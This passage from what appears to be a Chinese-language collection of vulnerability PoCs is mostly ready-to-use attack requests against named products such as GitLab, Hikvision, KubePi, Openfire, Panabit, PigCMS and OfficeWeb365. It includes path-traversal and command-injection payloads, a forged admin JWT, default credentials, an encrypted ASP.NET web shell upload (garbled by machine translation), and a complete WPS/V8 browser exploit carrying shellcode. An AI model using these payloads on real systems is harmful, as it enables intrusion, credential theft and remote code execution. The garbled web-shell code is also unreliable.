</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><div class="language- line-numbers-mode"><pre class="language-text"><code>HTTP/1.1 500 Internal Server Error
Date: Fri, 31 Mar 2023 12:37:55 GMT
Server: Apache/2.4.41 (Ubuntu)
Access-Control-Allow-Origin: *
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Disposition: attachment; filename=&quot;test.pdf&quot;
X-DEBUGKIT-ID: d383f6d4-6680-4db0-b574-fe789abc1718
Connection: close
Content-Type: text/html; charset=UTF-8
Content-Length: 2033469

&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;meta charset=&quot;utf-8&quot;/&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
&lt;title&gt;
Error: The exit status code '127' says something went wrong:
stderr: &amp;quot;sh: 1: --dpi: not found
&amp;quot;
stdout: &amp;quot;1: lo: &amp;lt;LOOPBACK,UP,LOWER_UP&amp;gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: ens33: &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether [redacted] brd ff:ff:ff:ff:ff:ff
    inet [redacted] brd [redacted] scope global ens33
       valid_lft forever preferred_lft forever
    inet6 [redacted] scope link
       valid_lft forever preferred_lft forever
&amp;quot;
command: ip a; --dpi '90' --lowquality --margin-bottom '0' --margin-left '0'
--margin-right '0' --margin-top '0' --orientation 'Landscape'
--javascript-delay '1000' '/tmp/knp_snappy6426d4231040e1.91046751.html'
'/tmp/knp_snappy6426d423104587.46971034.pdf'. &lt;/title&gt;

[...]
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br></div></div><h2 id="_7-gitlab路径遍历读取任意文件漏洞"><a href="#_7-gitlab路径遍历读取任意文件漏洞" class="header-anchor">#</a> 7.gitlab路径遍历读取任意文件漏洞</h2> <p>可能需要登录</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>GET /group1/group2/group3/group4/group5/group6/group7/group8/group9/project9/uploads/4e02c376ac758e162ec674399741e38d//..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="_8-hikvision-视频编码设备接入网关-showfile-php-任意文件下载漏洞"><a href="#_8-hikvision-视频编码设备接入网关-showfile-php-任意文件下载漏洞" class="header-anchor">#</a> 8.HIKVISION 视频编码设备接入网关 showFile.php 任意文件下载漏洞</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>&lt;?php
          $file_name = $_GET['fileName'];
          $file_path = '../../../log/'.$file_name;
          $fp = fopen($file_path, &quot;r&quot;);
          while($line = fgets($fp)){
            $line = nl2br(htmlentities($line, ENT_COMPAT, &quot;utf-8&quot;));
            echo '&lt;span style=&quot;font-size:16px&quot;&gt;'.$line.'&lt;/span&gt;';
          }
          fclose($fp);
?&gt;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><div class="language- line-numbers-mode"><pre class="language-text"><code>/serverLog/showFile.php?fileName=../web/html/main.php
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="_9-hikvision-综合安防管理平台-env-信息泄漏漏洞"><a href="#_9-hikvision-综合安防管理平台-env-信息泄漏漏洞" class="header-anchor">#</a> 9.HiKVISION 综合安防管理平台 env 信息泄漏漏洞</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>/artemis-portal/artemis/env
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="_10-hytec-inter-hwl-2511-ss-popen-cgi命令注入漏洞"><a href="#_10-hytec-inter-hwl-2511-ss-popen-cgi命令注入漏洞" class="header-anchor">#</a> 10.Hytec Inter HWL-2511-SS popen.cgi命令注入漏洞</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>title=&quot;index&quot; &amp;&amp; header=&quot;lighttpd/1.4.30&quot;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><div class="language- line-numbers-mode"><pre class="language-text"><code>/cgi-bin/popen.cgi?command=ping%20-c%204%201.1.1.1;cat%20/etc/shadow&amp;v=0.1303033443137912
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="_10-jeecg-boot-freemarker-模版注入漏洞"><a href="#_10-jeecg-boot-freemarker-模版注入漏洞" class="header-anchor">#</a> 10.Jeecg-Boot Freemarker 模版注入漏洞</h2> <h2 id="_11-kubepi-jwtsigkey-登陆绕过漏洞-cve-2023-22463"><a href="#_11-kubepi-jwtsigkey-登陆绕过漏洞-cve-2023-22463" class="header-anchor">#</a> 11.KubePi JwtSigKey 登陆绕过漏洞（CVE-2023-22463）</h2> <p><strong>漏洞描述</strong></p> <p>KubePi 中存在 JWT 硬编码，攻击者通过硬编码可以获取服务器后台管理权限，添加任意用户</p> <p><strong>漏洞影响</strong></p> <p>库贝派</p> <p><strong>网络测绘</strong></p> <p>“库贝皮”</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /kubepi/api/v1/users HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.127 Safari/537.36
accept: application/json
Accept-Encoding: gzip, deflate
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4iLCJuaWNrTmFtZSI6IkFkbWluaXN0cmF0b3IiLCJlbWFpbCI6InN1cHBvcnRAZml0MmNsb3VkLmNvbSIsImxhbmd1YWdlIjoiemgtQ04iLCJyZXNvdXJjZVBlcm1pc3Npb25zIjp7fSwiaXNBZG1pbmlzdHJhdG9yIjp0cnVlLCJtZmEiOnsiZW5hYmxlIjpmYWxzZSwic2VjcmV0IjoiIiwiYXBwcm92ZWQiOmZhbHNlfX0.XxQmyfq_7jyeYvrjqsOZ4BB4GoSkfLO2NvbKCEQjld8

{
  &quot;authenticate&quot;: {
       &quot;password&quot;: &quot;{{randstr}}&quot;
  },
  &quot;email&quot;: &quot;{{randstr}}@qq.com&quot;,
  &quot;isAdmin&quot;: true,
  &quot;mfa&quot;: {
          &quot;enable&quot;: false
   },
  &quot;name&quot;: &quot;{{randstr}}&quot;,
  &quot;nickName&quot;: &quot;{{randstr}}&quot;,
  &quot;roles&quot;: [
       &quot;Supper User&quot;
  ]
}
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br></div></div><h2 id="_12-kuboard默认口令"><a href="#_12-kuboard默认口令" class="header-anchor">#</a> 12.Kuboard默认口令</h2> <p>漏洞描述：</p> <p>Kuboard，是一款免费的 Kubernetes 图形化管理工具，Kuboard 力图帮助用户快速在 Kubernetes 上落地微服务。Kuboard存在默认口令可以通过默认口令登录Kuboard，管理Kubernetes。</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>admin/kuboard123
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="_13livebos-showimage-do文件imgname参数读取漏洞"><a href="#_13livebos-showimage-do文件imgname参数读取漏洞" class="header-anchor">#</a> 13LiveBos ShowImage.do文件imgName参数读取漏洞</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>/feed/ShowImage.do;.js.jsp?type=&amp;imgName=../../../../../../../../../../../../../../../etc/passwd
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="_13-milesight-vpn-server-js-任意文件读取漏洞"><a href="#_13-milesight-vpn-server-js-任意文件读取漏洞" class="header-anchor">#</a> 13.Milesight VPN server.js 任意文件读取漏洞</h2> <p>POC:</p> <p>GET /../etc/passwd HTTP/1.1</p> <p>Host:</p> <p>Accept: <em>/</em></p> <p>Content-Type: application/x-www-form-urlencoded</p> <h2 id="_14-nacos-sync"><a href="#_14-nacos-sync" class="header-anchor">#</a> 14.Nacos-Sync</h2> <p><strong>漏洞成因</strong></p> <p>没进行权限校验。</p> <p>影响范围：Nacos-Sync 3.0</p> <p>fofa发现</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>title=&quot;nacos&quot; &amp;amp;&amp;amp; title==&quot;Nacos-Sync&quot;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>路径拼接</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>/#/serviceSync
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>利用方式</p> <p>访问之后直接是进入后台的样子~</p> <h2 id="_15-nginx配置错误导致的路径穿越风险"><a href="#_15-nginx配置错误导致的路径穿越风险" class="header-anchor">#</a> 15.nginx配置错误导致的路径穿越风险</h2> <p>漏洞自查PoC如下： https://github.com/hakaioffsec/navgix 该漏洞非0day，是一个路径穿越漏洞，可以直接读取nginx后台服务器文件。 有多家重点金融企业已中招，建议尽快进行自查。</p> <h2 id="_16-officeweb365-远程代码执行漏洞"><a href="#_16-officeweb365-远程代码执行漏洞" class="header-anchor">#</a> 16.OfficeWeb365 远程代码执行漏洞</h2> <p>【消息详情】：360漏洞云监测到网传《OfficeWeb365 远程代码执行漏洞》的消息，经漏洞云复核，确认为【真实】漏洞，漏洞影响【未知】版本，该漏洞标准化POC已经上传漏洞云情报平台，平台编号：360LDYLD-2023-00002453，情报订阅用户可登录漏洞云情报平台( https://loudongyun.360.cn/bug/list )查看漏洞详情。</p> <p>360漏洞云监测到网传《OfficeWeb365远程代码执行漏洞》的消息，经漏洞云复核，确认为【真实】漏洞，漏洞影响【未知】版本，该漏洞标准化POC已经升级漏洞云情报平台，平台编号： 360LDYLD-2023-00002453</p> <p># 详细</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /PW/SaveDraw?path=../../Content/img&amp;idx=1.aspx HTTP/1.1
主持人：xxx
用户代理：Mozilla/5.0（Macintosh；Intel Mac OS X 10_15_7）AppleWebKit/537.36（KHTML，如 Gecko）Chrome/88.0.434.18 Safari/537.36
内容长度：2265
内容类型：application/x-www-form-urlencoded
接受编码：gzip、deflate
连接：关闭
数据:image/png;base64,01s34567890123456789y12345678901234567m91&lt;%@ 页面语言=&quot;C#&quot; %&gt;
    &lt;%@Import 命名空间=&quot;System.Reflection&quot; %&gt;
    &lt;脚本运行=“服务器”&gt;
               私有字节[]解密（字节[]数据）
        {
            字符串键=“e45e329feb5d925b”；
            数据 = Convert.FromBase64String(System.Text.Encoding.UTF8.GetString(data));
            System.Security.Cryptography.RijndaelManaged aes = new System.Security.Cryptography.RijndaelManaged();
            aes.Mode = System.Security.Cryptography.CipherMode.ECB;
            aes.Key = Encoding.UTF8.GetBytes(key);
            aes.Padding = System.Security.Cryptography.PaddingMode.PKCS7;
            return aes.CreateDecryptor().TransformFinalBlock(data, 0, data.Length);
        }
        私有字节[]加密（字节[]数据）
        {
            字符串键=“e45e329feb5d925b”；
            System.Security.Cryptography.RijndaelManaged aes = new System.Security.Cryptography.RijndaelManaged();
            aes.Mode = System.Security.Cryptography.CipherMode.ECB;
            aes.Key = Encoding.UTF8.GetBytes(key);
            aes.Padding = System.Security.Cryptography.PaddingMode.PKCS7;
            返回 System.Text.Encoding.UTF8.GetBytes(Convert.ToBase64String(aes.CreateEncryptor().TransformFinalBlock(data, 0, data.Length)));
        }
    &lt;/脚本&gt;
        &lt;%
        //byte[] c=Request.BinaryRead(Request.ContentLength);Assembly.Load(Decrypt(c)).CreateInstance(&quot;U&quot;).Equals(this);
                byte[] c=Request.BinaryRead(Request.ContentLength);
          string asname=System.Text.Encoding.ASCII.GetString(new byte[] {0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x52,0x65,0x66,0x6c,0x65,0x63,0x74,0x69,0x6f, 0x6e,0x2e,0x41,0x73,0x73,0x65,0x6d,0x62,0x6c,0x79});
          类型程序集=Type.GetType(asname);
           MethodInfo load = assembly.GetMethod(&quot;Load&quot;,new Type[] {new byte[0].GetType()});
           对象 obj=load.Invoke(null, new object[]{Decrypt(c)});
           MethodInfo create = assembly.GetMethod(&quot;CreateInstance&quot;,new Type[] { &quot;&quot;.GetType()});
           字符串名称 = System.Text.Encoding.ASCII.GetString(new byte[] { 0x55 });
           object pay=create.Invoke(obj,new object[] { name });
           pay.Equals(this);%&gt;&gt;---
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br></div></div><h2 id="_17-openfire身份认证绕过漏洞"><a href="#_17-openfire身份认证绕过漏洞" class="header-anchor">#</a> 17.Openfire身份认证绕过漏洞</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>GET 
/user-create.jsp?csrf=Sio3WOA89y2L9Rl&amp;username=user1&amp;name=&amp;email=&amp;password=Qwer1234&amp;passwordConfirm=Qwer1234&amp;isadmin=on&amp;create=............
 HTTP/1.1
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><h2 id="_18-panabit-ixcache网关rce漏洞cve-2023-38646"><a href="#_18-panabit-ixcache网关rce漏洞cve-2023-38646" class="header-anchor">#</a> 18.Panabit iXCache网关RCE漏洞CVE-2023-38646</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /cgi-bin/Maintain/date_config HTTP/1.1
Host: 127.0.0.1:8443
Cookie: pauser_9667402_260=paonline_admin_44432_9663; pauser_9661348_661=paonline_admin_61912_96631
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 107

ntpserver=0.0.0.0%3Bwhoami&amp;year=2000&amp;month=08&amp;day=15&amp;hour=11&amp;minute=34&amp;second=53&amp;ifname=fxp1
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><h2 id="_19-panel-loadfile-后台文件读取漏洞"><a href="#_19-panel-loadfile-后台文件读取漏洞" class="header-anchor">#</a> 19.Panel loadfile 后台文件读取漏洞</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /api/v1/file/loadfile {&quot;paht&quot;:&quot;/etc/passwd&quot;}
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="_20-pigcms-action-flashupload-任意文件上传漏洞"><a href="#_20-pigcms-action-flashupload-任意文件上传漏洞" class="header-anchor">#</a> 20.PigCMS action_flashUpload 任意文件上传漏洞</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /cms/manage/admin.php?m=manage&amp;c=background&amp;a=action_flashUpload
HTTP/1.1
Host:
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=----aaa
------aaa
Content-Disposition: form-data; name=&quot;filePath&quot;; filename=&quot;test.php&quot;
Content-Type: video/x-flv
&lt;?php phpinfo();?&gt;
------aaa



/cms/upload/images/2023/08/11/1691722887xXbx.php
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><h2 id="_21-qax-vpn存在x遍历及任意账号密码修改漏洞"><a href="#_21-qax-vpn存在x遍历及任意账号密码修改漏洞" class="header-anchor">#</a> 21.QAX-Vpn存在x遍历及任意账号密码修改漏洞</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>https://x.xxx.xxx.cn/admin/group/x_group.php?id=1 
https://x.xxx.xxx.cn/admin/group/x_group.php?id=3 
cookie: admin id=1; gw admin ticket=1;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><h2 id="_22-smart-s85f-任意文件读取"><a href="#_22-smart-s85f-任意文件读取" class="header-anchor">#</a> 22.Smart S85F 任意文件读取</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>GET /log/decodmail.php?file=L2V0Yy9gc2xlZXAke0lGU30xMGAucGNhcA== HTTP/1.1
Host: x.x.x.x
Cookie: PHPSESSID=c36d5527fd784aa29748b3b1c50be7bc
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/114.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><h2 id="_23-wps-rce"><a href="#_23-wps-rce" class="header-anchor">#</a> 23.WPS RCE</h2> <p>wps影响范围为：WPS Office 2023 个人版 &lt; 11.1.0.15120</p> <p>WPS Office 2019 企业版 &lt; 11.8.2.12085</p> <p>POC</p> <p>在1.html当前路径下启动http server并监听80端口，修改hosts文件（测试写死的）</p> <p>127.0.0.1 clientweb.docer.wps.cn.cloudwps.cn</p> <p>漏洞触发需让域名规则满足clientweb.docer.wps.cn.{xxxxx}wps.cn cloudwps.cn和wps.cn没有任何关系</p> <p>代码块在底下。（需要原pdf加wechat）</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>&lt;script&gt;

if(typeof alert === &quot;undefined&quot;){

alert = console.log;

}

let f64 = new Float64Array(1);

let u32 = new Uint32Array(f64.buffer);

function d2u(v) {

f64[0] = v;

return u32;

}

function u2d(lo, hi) {

u32[0] = lo;

u32[1] = hi;

return f64[0];

}

function gc(){ // major

for (let i = 0; i &lt; 0x10; i++) {

new Array(0x100000);

}

}

function foo(bug) {

function C(z) {

Error.prepareStackTrace = function(t, B) {

return B[z].getThis();

};

let p = Error().stack;

Error.prepareStackTrace = null;

return p;

}

function J() {}

var optim = false;

var opt = new Function(

'a', 'b', 'c',

'if(typeof a===\'number\'){if(a&gt;2){for(var

i=0;i&lt;100;i++);return;}b.d(a,b,1);return}' +

'g++;'.repeat(70));

var e = null;

J.prototype.d = new Function(

'a', 'b', '&quot;use strict&quot;;b.a.call(arguments,b);return arguments[a];');

J.prototype.a = new Function('a', 'a.b(0,a)');

J.prototype.b = new Function(

'a', 'b',

'b.c();if(a){' +

'g++;'.repeat(70) + '}');

J.prototype.c = function() {

if (optim) {

var z = C(3);

var p = C(3);

z[0] = 0;

e = {M: z, C: p};

}

};

var a = new J();

// jit optim

if (bug) {

for (var V = 0; 1E4 &gt; V; V++) {

opt(0 == V % 4 ? 1 : 4, a, 1);

}

}

optim = true;

opt(1, a, 1);

return e;

}

e1 = foo(false);

e2 = foo(true);

delete e2.M[0];

let hole = e2.C[0];

let map = new Map();

map.set('asd', 8);

map.set(hole, 0x8);

map.delete(hole);

map.delete(hole);

map.delete(&quot;asd&quot;);

map.set(0x20, &quot;aaaa&quot;);

let arr3 = new Array(0);

let arr4 = new Array(0);

let arr5 = new Array(1);

let oob_array = [];

oob_array.push(1.1);

map.set(&quot;1&quot;, -1);

let obj_array = {

m: 1337, target: gc

};

let ab = new ArrayBuffer(1337);

let object_idx = undefined;

let object_idx_flag = undefined;

let max_size = 0x1000;

for (let i = 0; i &lt; max_size; i++) {

if (d2u(oob_array[i])[0] === 0xa72) {

object_idx = i;

object_idx_flag = 1;

break;

}if (d2u(oob_array[i])[1] === 0xa72) {

object_idx = i + 1;

object_idx_flag = 0;

break;

}

}

function addrof(obj_para) {

obj_array.target = obj_para;

let addr = d2u(oob_array[object_idx])[object_idx_flag] - 1;

obj_array.target = gc;

return addr;

}

function fakeobj(addr) {

let r8 = d2u(oob_array[object_idx]);

if (object_idx_flag === 0) {

oob_array[object_idx] = u2d(addr, r8[1]);

}else {

oob_array[object_idx] = u2d(r8[0], addr);

}

return obj_array.target;

}

let bk_idx = undefined;

let bk_idx_flag = undefined;

for (let i = 0; i &lt; max_size; i++) {

if (d2u(oob_array[i])[0] === 1337) {

bk_idx = i;

bk_idx_flag = 1;

break;

}if (d2u(oob_array[i])[1] === 1337) {

bk_idx = i + 1;

bk_idx_flag = 0;

break;

}

}

let dv = new DataView(ab);

function get_32(addr) {

let r8 = d2u(oob_array[bk_idx]);

if (bk_idx_flag === 0) {

oob_array[bk_idx] = u2d(addr, r8[1]);

} else {

oob_array[bk_idx] = u2d(r8[0], addr);

}

let val = dv.getUint32(0, true);

oob_array[bk_idx] = u2d(r8[0], r8[1]);

return val;

}

function set_32(addr, val) {

let r8 = d2u(oob_array[bk_idx]);

if (bk_idx_flag === 0) {

oob_array[bk_idx] = u2d(addr, r8[1]);

} else {

oob_array[bk_idx] = u2d(r8[0], addr);

}

dv.setUint32(0, val, true);

oob_array[bk_idx] = u2d(r8[0], r8[1]);

}

function write8(addr, val) {

let r8 = d2u(oob_array[bk_idx]);

if (bk_idx_flag === 0) {

oob_array[bk_idx] = u2d(addr, r8[1]);

} else {

oob_array[bk_idx] = u2d(r8[0], addr);

}

dv.setUint8(0, val);

}

let fake_length = get_32(addrof(oob_array)+12);

set_32(get_32(addrof(oob_array)+8)+4,fake_length);

let wasm_code = new

Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,

128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,

128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0

,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);

let wasm_mod = new WebAssembly.Module(wasm_code);

let wasm_instance = new WebAssembly.Instance(wasm_mod);

let f = wasm_instance.exports.main;

let target_addr = addrof(wasm_instance)+0x40;

let rwx_mem = get_32(target_addr);

//alert(&quot;rwx_mem is&quot;+rwx_mem.toString(16));

const shellcode = new Uint8Array([0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89,

0xe5, 0x31, 0xc0, 0x64, 0x8b, 0x50, 0x30,0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14,

0x8b, 0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff,0xac, 0x3c, 0x61, 0x7c,

0x02, 0x2c, 0x20, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xe2, 0xf2, 0x52,0x57, 0x8b,

0x52, 0x10, 0x8b, 0x4a, 0x3c, 0x8b, 0x4c, 0x11, 0x78, 0xe3, 0x48, 0x01,

0xd1,0x51, 0x8b, 0x59, 0x20, 0x01, 0xd3, 0x8b, 0x49, 0x18, 0xe3, 0x3a, 0x49,

0x8b, 0x34, 0x8b,0x01, 0xd6, 0x31, 0xff, 0xac, 0xc1, 0xcf, 0x0d, 0x01, 0xc7,

0x38, 0xe0, 0x75, 0xf6, 0x03,0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75, 0xe4, 0x58,

0x8b, 0x58, 0x24, 0x01, 0xd3, 0x66, 0x8b,0x0c, 0x4b, 0x8b, 0x58, 0x1c, 0x01,

0xd3, 0x8b, 0x04, 0x8b, 0x01, 0xd0, 0x89, 0x44, 0x24,0x24, 0x5b, 0x5b, 0x61,

0x59, 0x5a, 0x51, 0xff, 0xe0, 0x5f, 0x5f, 0x5a, 0x8b, 0x12, 0xeb,0x8d, 0x5d,

0x6a, 0x01, 0x8d, 0x85, 0xb2, 0x00, 0x00, 0x00, 0x50, 0x68, 0x31, 0x8b,

0x6f,0x87, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x68, 0xa6, 0x95, 0xbd,

0x9d, 0xff, 0xd5,0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,

0x47, 0x13, 0x72, 0x6f, 0x6a,0x00, 0x53, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63,

0x00]);

for(let i=0;i&lt;shellcode.length;i++){

write8(rwx_mem+i,shellcode[i]);

}

f();

&lt;/script&gt;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span 